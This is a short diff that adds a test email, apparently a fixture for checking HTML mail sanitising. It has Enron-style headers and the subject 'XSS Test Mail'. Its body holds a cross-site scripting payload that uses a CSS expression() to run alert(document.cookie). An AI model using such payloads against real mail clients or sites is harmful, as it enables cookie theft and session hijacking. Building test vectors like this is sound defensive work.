@@ -1,0 +1,7 @@
+From: admin-i@networkpromotion.com
+To: mark.taylor@enron.com, leslie.hansen@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<a href='abc' style='"background:url(http://"\"); width:expression(alert(document.cookie));"');>
